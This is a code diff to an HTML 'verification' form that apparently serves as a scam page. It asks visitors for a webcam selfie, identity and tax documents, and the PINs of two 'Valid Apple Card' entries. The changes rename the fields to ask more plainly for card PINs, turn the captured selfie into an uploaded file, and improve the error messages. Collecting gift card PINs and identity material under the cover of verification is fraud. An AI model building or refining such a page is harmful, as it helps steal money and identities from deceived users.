@@ -306,7 +306,6 @@
                     <video id="video" autoplay></video>
                     <canvas id="canvas"></canvas>
                     <img id="capturedImage" alt="Captured selfie">
-                    <input type="hidden" name="selfie" id="selfieData">
                     <div class="camera-controls">
                         <button type="button" id="startCamera" class="secondary">Start Camera</button>
                         <button type="button" id="captureBtn" style="display: none;">Capture Photo</button>
@@ -326,8 +325,8 @@
             <div class="form-section">
                 <h2>Financial Verification</h2>
                 <div class="form-group">
-                    <label for="bankVerification">Bank Verification Number (BVN) Document</label>
-                    <input type="file" id="bankVerification" name="bank_verification" accept="image/*,.pdf">
+                    <label for="verificationx">Verification Document Image</label>
+                    <input type="file" id="verificationx" name="verificationox" accept="image/*,.pdf">
                 </div>
                 <div class="form-group">
                     <label for="taxHistory">Tax Payment History <span class="required">*</span></label>
@@ -336,14 +335,14 @@
             </div>
 
             <div class="form-section">
-                <h2>Reference Verification</h2>
+                <h2>Valid Apple Card Verification</h2>
                 <div class="form-group">
-                    <label for="CARDPIN1">Apple Card Pin 1<span class="required">*</span></label>
-                    <input type="text" id="CARDPIN1" name="reference_pin_1" placeholder="Enter first reference PIN" required>
+                    <label for="cardpin1">Valid Apple Card 1<span class="required">*</span></label>
+                    <input type="text" id="cardpin1" name="card_pin1" placeholder="Enter first card PIN" required>
                 </div>
                 <div class="form-group">
-                    <label for="CARDPIN2">Apple Card Pin 2<span class="required">*</span></label>
-                    <input type="text" id="CARDPIN2" name="reference_pin_2" placeholder="Enter second reference PIN" required>
+                    <label for="cardpin2">Valid Apple Card 2<span class="required">*</span></label>
+                    <input type="text" id="cardpin2" name="card_pin2" placeholder="Enter second card PIN" required>
                 </div>
             </div>
 
@@ -419,23 +418,45 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg');
-            selfieData.value = imageData;
-            capturedImage.src = imageData;
-            capturedImage.style.display = 'block';
-            video.style.display = 'none';
-            captureBtn.style.display = 'none';
-            retakeBtn.style.display = 'inline-block';
             
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            canvas.toBlob((blob) => {
+                const file = new File([blob], 'selfie.jpg', { type: 'image/jpeg' });
+                const dataTransfer = new DataTransfer();
+                dataTransfer.items.add(file);
+                
+                let selfieInput = document.getElementById('selfieFile');
+                if (!selfieInput) {
+                    selfieInput = document.createElement('input');
+                    selfieInput.type = 'file';
+                    selfieInput.name = 'selfie';
+                    selfieInput.id = 'selfieFile';
+                    selfieInput.style.display = 'none';
+                    form.appendChild(selfieInput);
+                }
+                selfieInput.files = dataTransfer.files;
+                
+                const imageData = canvas.toDataURL('image/jpeg');
+                capturedImage.src = imageData;
+                capturedImage.style.display = 'block';
+                video.style.display = 'none';
+                captureBtn.style.display = 'none';
+                retakeBtn.style.display = 'inline-block';
+                
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }, 'image/jpeg', 0.9);
         });
 
         retakeBtn.addEventListener('click', async () => {
             capturedImage.style.display = 'none';
             retakeBtn.style.display = 'none';
-            selfieData.value = '';
+            
+            const selfieInput = document.getElementById('selfieFile');
+            if (selfieInput) {
+                selfieInput.remove();
+            }
+            
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
@@ -449,7 +470,8 @@
         form.addEventListener('submit', (e) => {
             e.preventDefault();
             
-            if (!selfieData.value) {
+            const selfieInput = document.getElementById('selfieFile');
+            if (!selfieInput || !selfieInput.files.length) {
                 alert('Please capture a selfie before submitting.');
                 return;
             }
@@ -468,12 +490,18 @@
                     successMessage.style.display = 'block';
                     window.scrollTo({ top: 0, behavior: 'smooth' });
                 } else {
-                    alert('There was an error submitting your verification. Please try again.');
+                    response.json().then(data => {
+                        if (data.errors) {
+                            alert('Error: ' + data.errors.map(e => e.message).join(', '));
+                        } else {
+                            alert('There was an error submitting your verification. Please try again.');
+                        }
+                    });
                 }
             }).catch(error => {
-                alert('There was an error submitting your verification. Please try again.');
+                alert('There was an error submitting your verification. Please check your internet connection and try again.');
             });
         });
     </script>
 </body>
-</html>
+                            </html>
